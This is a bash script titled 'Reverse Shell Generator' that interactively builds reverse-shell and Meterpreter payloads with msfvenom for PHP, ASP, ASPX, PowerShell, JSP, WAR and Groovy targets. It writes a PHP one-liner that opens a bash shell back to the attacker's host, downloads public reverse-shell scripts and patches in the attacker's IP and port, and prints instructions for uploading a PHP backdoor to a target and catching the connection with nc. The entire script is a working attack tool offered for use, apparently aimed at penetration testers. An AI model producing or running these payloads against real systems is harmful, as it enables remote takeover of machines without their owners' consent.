#!/bin/bash

######################################
#	Reverse Shell Generator      #
######################################
#	          	~By Kunal Patel

                                                                                                               
echo "
  _________              __  .__              .__ _______________________   
 /   _____/ ____   _____/  |_|__| ____ _____  |  /   __   \_____  \   _  \  
 \_____  \_/ __ \ /    \   __\  |/    \\__  \ |  \____    //  ____/  /_\  \ 
 /        \  ___/|   |  \  | |  |   |  \/ __ \|  |__/    //       \  \_/   \
 |
/_______  /\___  >___|  /__| |__|___|  (____  /____/____/ \_______ \_____  /
        \/     \/     \/             \/     \/                    \/     \/ 

"

###############################
# To be Implemented in Future #
###############################

# Lot's of One liners
# Base64 encoded Powershell reverse shell
# Android APK Reverse Shell
# OSx Reverse Shell

#Checking whether Requirements are properly Installed or not
type perl >/dev/null 2>&1 || { echo >&2 "Perl is not installed.  Aborting."; exit 1; }
type curl >/dev/null 2>&1 || { echo >&2 "curl is not installed.  Aborting."; exit 1; }
type msfvenom >/dev/null 2>&1 || { echo >&2 "Metasploit is not installed or not configured for current User.  Aborting."; exit 1; }

#Checking whether script running as root or not
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

echo "======================================"
echo '[+] Welcome to Reverse Shell Generator'
echo "======================================="
echo ""
echo ""

read -p '[+] Enter LHOST:' LH
	if [[ $LH =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
		echo "Success"
	else
		echo "Invalid IP"
		exit
	fi
read -p '[+] Enter LPORT:' LP
	if [[ $LP -gt 65535 ]]; then
		echo "Invalid PORT"
		exit
	else
		echo "Success"
	fi
read -p '[+] Select Arch
	1. x86
	2. x64
:' AR
read -p '[+] Select Operating System
	1.Windows
	2.Linux
	
:' OS 
  # Add more options Later
  # 3.Android
  # 4.Mac

read -p '[+] Select Payload Format:
	1. PHP
	2. ASP
	3. ASPX
	4. Powershell
	5. Java
	
:' F 

read -p '[+] Payload Option:
	1. Meterpreter
	2. Simple_Netcat
:' PAYLOAD
	
#   MSFVENOM
# /////////////
msfvenom_meterpreter(){
	

	read -p '[+] Save Output File as? ' OUT
	#php Staged and unstaged meterpreter (WINDOWS & LINUX)
 	if [[ $F -eq "1" ]]; then
		msfvenom -p php/meterpreter_reverse_tcp LHOST=$LH LPORT=$LP -f raw > $OUT
		echo "OUTPUT SAVED IN $OUT"
	fi
	
	#asp Meterpreter
	if [[ $F -eq "2" ]]; then
		#asp 32bit meterpreter WINDOWS
		if [[ $AR -eq "1" && $OS -eq "1" ]]; then
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
		#asp 64 bit meterpreter WINDOWS
		elif [[ $AR -eq "2" && $OS -eq "1" ]]; then
		 	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
		#asp 32bit meterpreter LINUX	
		elif [[ $AR -eq "1" && $OS -eq "2" ]]; then	
			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
		#asp 64bit meterpreter LINUX
		elif [[ $AR -eq "2" && $OS -eq "2" ]]; then
			msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
		fi
		echo "OUTPUT SAVED IN $OUT"
	fi
	
	#Powershell Meterpreter
	if [[ $F -eq "4" ]]; then


		#Powershell 64bit meterpreter WINDOWS
		if [[ $AR -eq "2" && $OS -eq "1" ]]; then
			echo "Generating x64 powershell meterpreter"
			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT
		#Powershell 32bit meterpreter WINDOWS
		elif [[ $AR -eq "1" && $OS -eq "1" ]]; then
			echo "Generating x32 powershell meterpreter"
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT
			 
		fi
		echo "OUTPUT SAVED IN $OUT"
	fi
		
	
}





#  SIMPLE_NETCAT
# ////////////////
simple_netcat(){
	
	read -p '[+] Save Output File as? ' OUT

	#####
	#PHP#
	#####

	#PHP LINUX
	if [[ $F -eq "1" && $OS -eq "2" ]]; then
		read -p '[+] Select PHP payload type
	1. PHP One Liner Linux
	2. PHP Pentest Monkeys reverse shell Linux
				: ' SPP
			if [[ $SPP -eq "1" ]]; then	
				echo "Generated Payload"
				echo "================="
				echo ""
				echo "php -r '\$sock=fsockopen(\"$LH\",$LP);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" > $OUT
				echo "SAVED in $OUT"
				
			
			elif [[ $SPP -eq "2" ]]; then
			
				echo "Downloading Pentestmonkey PHP Reverse Shell"
				echo "==========================================="
				echo ""
				curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -o $OUT
				echo "Adding LHOST"
				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
				echo "Adding LPORT"	
				perl -pi -e 's/1234/'$LP'/g' $OUT
				echo "Output Saved in $OUT"
	
			fi
	fi	

	#php WINDOWS	
	if [[ $F -eq "1" && $OS -eq "1" ]]; then
		read -p '[+] Select PHP payload type
	1. PHP Simple Reverse windows
	2. PHP Binary Reverse Windows
				:' WPP
		if [[ $WPP -eq "1" ]]; then
			echo "PHP SIMPLE NETCAT WINDOWS"
			echo "========================="
			echo ""
			echo "Starting Download"
			echo ""
			echo ""
			curl https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php -o $OUT
			perl -pi -e 's/192.168.1.9/'$LH'/g' $OUT
			perl -pi -e 's/1234/'$LP'/g' $OUT
			echo ""
			echo "Output Saved in $OUT"
			echo ""

		elif [[ $WPP -eq "2" ]]; then

			echo "PHP BINARY REVERSE BACKDOOR"
			echo "==========================="
			echo ""
			echo "Usage: Upload $OUT to target then execute by sending lhost and lport using curl"
			echo "-----"
			echo "Example:"
			echo '		Terminal 1: curl http://target.com.br/phprevshell.php -d "host=192.168.1.20&port=4444"'
			echo "		Terminal 2: nc -lp 4444"
			echo ""	
			echo "Downloading PHP_bin_backdoor"
			echo "----------------------------"
			curl https://raw.githubusercontent.com/Sentinal920/Pentest-tools/master/Win_php_bin_rev_shell/php_rshell.php -o $OUT
			echo ""
			echo "SAVED IN $OUT"
			echo ""
		fi
	fi

	#####
	#ASP#
	#####

	#asp Simple Netcat
	
	if [[ $F -eq "2" && $OS -eq "1" ]]; then

		read -p '[+] Payload Type:
	1. Staged 
	2. Unstaged
:' SU

			if [[ $SU -eq "2" ]]; then
				#asp unstaged windows 32 and 64 bit
				msfvenom -p windows/shell_reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
			fi
			if [[ $SU -eq "1" ]]; then
				#asp staged windows 32 and 64 bit
				msfvenom -p windows/shell/reverse_tcp LHOST=$LH LPORT=$LP -f asp > $OUT
			fi
			echo "Saved in $OUT"

	fi



	############
	#powershell#	
	############

	#Powershell Simple Netcat

	if [[ $F -eq "4" ]]; then	
		if [[ $AR -eq "1" ]]; then
			#powershell 64bit simple netcat reverse shell
			echo "Generating Powershell x64 unstaged Rev shell"
			echo "============================================"
	    		msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT             
		elif [[ $AR -eq "2" ]]; then
			#powershell 64bit simple netcat reverse shell
			echo "Generating Powershell x32 unstaged Rev shell"
			echo "============================================"
	    		msfvenom -p windows/powershell_reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT             
		fi
		echo "Saved in $OUT"
	fi

	


	######
	#ASPX#
	######
		
	#ASPX Simple Netcat

	if [[ $F -eq "3" ]]; then
		read -p '[+] Payload Type:
	1. Staged 
	2. Unstaged
:' SU
			if [[ $AR -eq "1" && $SU -eq "2" ]]; then
				#aspx unstaged windows 32 bit
				msfvenom -p windows/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
				
			elif [[ $AR -eq "2" && $SU -eq "2" ]]; then
				#aspx unstaged windows 64 bit
				msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT

			elif [[ $AR -eq "1" && $SU -eq "1" ]]; then
				#aspx staged windows 32 bit
				msfvenom -p windows/shell/reverse_tcp LHOST=LH LPORT=$LP -f aspx > $OUT
			elif [[ $AR -eq "2" && $SU -eq "1" ]]; then
				#aspx staged windows 64 bit
				msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
			fi
			echo "Saved in $OUT"
	fi


	#####   #####
	#JSP#	#WAR#
	#####   #####

	if [[ $F -eq "5" ]]; then
		read -p '[+] Payload Type:
	1. JSP
	2. WAR
	3. Groovy
:' JW	
			if [[ $JW -eq "1" ]]; then
				#JSP Java Reverse TCP
				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LH LPORT=$LP -f raw > $OUT
			elif [[ $JW -eq "2" ]]; then
				#WAR Java reverse TCP
				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LH LPORT=$LP -f war > $OUT
			elif [[ $JW -eq "3" && $OS -eq "1" ]]; then
				#WINDOWS GROOVY
				curl https://raw.githubusercontent.com/Sentinal920/Pentest-Tools/master/Reverse_Shells/Revwin.groovy -o $OUT
				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
				perl -pi -e 's/920/'$LP'/g' $OUT
			elif [[ $JW -eq "3" && $OS -eq "2" ]]; then
				#LINUX GROOVY
				curl https://raw.githubusercontent.com/Sentinal920/Pentest-Tools/master/Reverse_Shells/Revlin.groovy -o $OUT
				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
				perl -pi -e 's/920/'$LP'/g' $OUT

			fi
	fi

	########
	#python#
	########
			#python
			#msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
	
	######	
	#bash#
	######	
			#bash
			#msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh

	######
	#perl#
	######
			#perl
			#msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl



}


if [[ $F -eq "2" && $OS -eq "2" ]]; then
	echo "Wrong OS Selection: ASP Reverse Shells are supposed to be for Windows "
	exit
elif [[ $F -eq "5" && $OS -eq "2" ]]; then
	echo "Wrong OS Selection: ASPX Reverse Shells are supposed to be for Windows "
	exit
fi

if [[ $PAYLOAD -eq "1" ]]; then
	msfvenom_meterpreter

elif [[ $PAYLOAD -eq "2"  ]]; then
	simple_netcat

else
      echo "Select proper Format"
fi


